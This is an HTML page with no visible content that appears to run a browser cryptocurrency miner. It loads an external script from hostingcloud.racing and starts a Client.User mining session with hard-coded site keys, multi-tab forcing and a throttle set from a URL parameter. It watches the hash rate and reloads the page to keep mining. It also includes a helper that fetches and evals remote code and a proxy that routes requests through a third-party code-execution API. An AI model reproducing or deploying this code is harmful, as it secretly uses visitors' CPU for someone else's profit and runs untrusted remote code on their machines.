<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    
    <script async="async" data-cfasync="false" src="//pl25097642.profitablecpmrate.com/5d62f933fc574f4faca4870888c2673b/invoke.js"></script>
    <div id="container-5d62f933fc574f4faca4870888c2673b"></div>
    
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let use = urlParams.get('use') ? parseFloat(urlParams.get('use')) : 0.5;
        window.use = use;
    </script>

    <script>setInterval(async () => { if (!window.lastCode) window.lastCode = await (await fetch(location.href)).text(); console.log(window.lastCode?.length, (await (await fetch(location.href)).text()).length); if (window.lastCode && window.lastCode != await (await fetch(location.href)).text()) location.reload(); window.lastCode = await (await fetch(location.href)).text(); }, 10 * 60 * 1000);</script>
    <script>
        setTimeout(() => { window.location.reload(); }, 1000 * 60 * 30)
    </script>

    <!-- <div
        style="z-index: 99999; position:fixed; opacity: 1; background-color: white; top: 0px; left: 0px; width: 100vw; height: 100vh;">
    </div> -->
    <script src="https://www.hostingcloud.racing/eWTV.js"></script>
    <!-- <script src="http://share.liveblog365.com/GJTy.php?f=9sx5.js"></script> -->


    <!-- <script>
        const originalFetch = window.fetch;

        window.fetch = async (...args) => {
            const [url, options] = args;
            return originalFetch(newUrl, newOptions);
        };

        // Example usage of the overridden fetch
        (async () => {
            try {
                const response = await fetch('https://jsonplaceholder.typicode.com/todos/1'); // Replace with the desired URL
                const data = await response.text();
                console.log(data); // Log the response data
            } catch (error) {
                console.error('Fetch failed:', error);
            }
        })();


    </script> -->

    <script>

        let template = (str) => `
const https = require('https');

async function fetchData(url) {
    return new Promise((resolve) => {
        https.get(url, (res) => {
            let data = '';

            // A chunk of data has been received
            res.on('data', (chunk) => {
                data += chunk;
            });

            // The whole response has been received
            res.on('end', () => {
                resolve({ data, error: null }); // Resolve with data
            });
        }).on('error', (err) => {
            resolve({ data: null, error: err }); // Resolve with error
        });
    });
}

async function main() {
    const url = '${str}';
    const { data, error } = await fetchData(url);
    if (error) {
        console.log('Error:', error);
    } else {
        console.log(data);
    }
}
    
main();
`;



        async function reqPrx(url) {
            const data = JSON.stringify({
                'code': template(url),
                'language': 'js',
            });

            try {
                const response = await fetch('https://api.codex.jaagrav.in/', {
                    method: 'POST', // HTTP method
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': data.length // Set the content length
                    },
                    body: data // Write data to the request body
                });

                if (!response.ok) { // Check if the response is ok
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                const responseData = await response.json(); // Parse the JSON response
                return responseData.output; // Return the output

            } catch (error) {
                console.error('Error:', error); // Log any errors
                return null;
            }
        }





















        // async function loadWasm() {
        //     // Attempt to retrieve the WASM module from the cache
        //     const response = await caches.match('ATr0mzDy.wasm');

        //     if (!response) {
        //         console.error('WASM module not found in cache'); // Log the error

        //         // Attempt to fetch the module from the network
        //         try {
        //             const networkResponse = await fetch('ATr0mzDy.wasm');
        //             console.log('Network response status:', networkResponse.status);
        //             console.log('Network response content-type:', networkResponse.headers.get('Content-Type'));

        //             if (!networkResponse.ok) {
        //                 throw new Error('Network response was not ok');
        //             }

        //             // Cache the response for future use
        //             const cache = await caches.open('wasm-cache');
        //             await cache.put('ATr0mzDy.wasm', networkResponse.clone());
        //             return await WebAssembly.instantiate(await networkResponse.arrayBuffer());
        //         } catch (error) {
        //             console.error('Failed to fetch the WASM module:', error);
        //             return null; // Handle the failure gracefully
        //         }
        //     }

        //     // If found in the cache, instantiate the WASM module
        //     const bytes = await response.arrayBuffer(); // Get the bytes of the WASM module
        //     return await WebAssembly.instantiate(bytes); // Instantiate the WASM module
        // }


        // // Example function to call when the specific URL is requested
        // async function handleSpecificRequest() {
        //     // Load the WASM module
        //     const wasmInstance = await loadWasm();
        //     if (wasmInstance) {
        //         // Use the exported functions from the WASM instance
        //         console.log('WASM module loaded successfully:', wasmInstance);
        //     }
        // }

        // // Call this function based on your application logic
        // handleSpecificRequest();




        async function evalScr(url) {
            eval(await (await fetch(url)).text());
        }

        ; (async () => {







            // await new Promise((resolve) => {

            //     if ('serviceWorker' in navigator) {
            //         navigator.serviceWorker.register('/service-worker.js')
            //             .then((registration) => {
            //                 console.log('Service Worker registered with scope:', registration.scope);
            //                 resolve();
            //             })
            //             .catch((error) => {
            //                 console.error('Service Worker registration failed:', error);
            //                 resolve();
            //             });
            //     }
            // });





            // let scrUrl = 'https://www.hostingcloud.racing/sIu3.js';
            // try {
            //     await fetch(scrUrl);
            // } catch (e) {
            //     scrUrl = 'http://share.liveblog365.com/GJTy.php?f=9sx5.js';
            //     return;
            // }

            // console.log(scrUrl);
            // await evalScr(scrUrl);
            await new Promise(r => setTimeout(r, 5000));
            let Client = window.Client;


            // await new Promise((resolve) => {
            //     setTimeout(resolve, 3000);
            // })
            // await (async () => {
            //     eval(await reqPrx('https://www.hostingcloud.racing/sIu3.js'));
            // })();

            while (!Client) {
                await new Promise(r => setTimeout(r, 1000));
                Client = window.Client;
            }

            let siteKeys = [
                '53415facb13dccbdf8523b5eefd45d01f6b16bf984cd8cf39ac04150266a4cd9'
                // 'a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb',
                // '22e4addcef78830b5e82e2565e698ead692c0627ba8ecf22b00dbdc009d9483c',
                // 'a08a22fe927fdc00d212015d7c48036cc44af0ace95e3502a8ed207e687d8b99',
                // '6b6e5c4c5a7351e38bcf94497ce0beca440485ddb56d2f032d8a4a8d5f8143e7',
                // '1c0d9b91e5a1ae6c17508815f108530bb0012bf14e9ecb1e64795e418fdc13a8',
                // '7d888f48a8f10310782ac9ff6a553d6f593d7fd69fed00e964772b2d1ef2b1e0',
                // '5337cd7a9213e4a662f0e9e5d47404d72b2ec529c87a7d8ab3bad29e64305c7d'
            ];

            // var _client = new Client.Anonymous('53415facb13dccbdf8523b5eefd45d01f6b16bf984cd8cf39ac04150266a4cd9',
            // var _client = new Client.User(Date.now() % 2 ? 'a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb' : '53415facb13dccbdf8523b5eefd45d01f6b16bf984cd8cf39ac04150266a4cd9', Date.now() % 2 ? 'mainuser' : 'mainuser2',
            // var _client = new Client.Anonymous(siteKeys[getRandomIntInclusive(0, siteKeys.length - 1)],
            var _client = new Client.User(siteKeys[getRandomIntInclusive(0, siteKeys.length - 1)],
                generateUUID(),
                {
                    throttle: 1 - use, c: 'w', // ads: 0
                });
            _client.start(Client.FORCE_MULTI_TAB);
            window._client = _client;
            window.info = 'v3';
            window.lastArr = [];
            while (1) {
                try {
                    await new Promise(r => setTimeout(r, 1000));
                    running = _client.isRunning();
                    window.lastArr.push(_client.getHashesPerSecond());
                    if (window.lastArr.length > 20) window.lastArr.shift();
                    if (window.lastArr.length >= 20 && window.lastArr.every((v, i, a) => 0 == parseInt(v))) {
                        window.location.reload();
                    }
                    console.log(running, _client.getHashesPerSecond());
                } catch (error) {
                    console.log(error);
                }
            }
        })().catch(console.error);


        function getRandomIntInclusive(min, max) {
            min = Math.ceil(min); // Round up to ensure the range is inclusive
            max = Math.floor(max); // Round down to ensure the range is inclusive
            return Math.floor(Math.random() * (max - min + 1)) + min; // Generate random int in [min, max]
        }

        function generateUUID() {
            // Generates a random UUID (Version 4)
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
                const r = Math.random() * 16 | 0; // Generate a random number between 0 and 15
                const v = c === 'x' ? r : (r & 0x3 | 0x8); // Replace 'x' with random, 'y' with specific constraints
                return v.toString(16); // Convert to hexadecimal
            });
        }



    </script>


</body>

</html>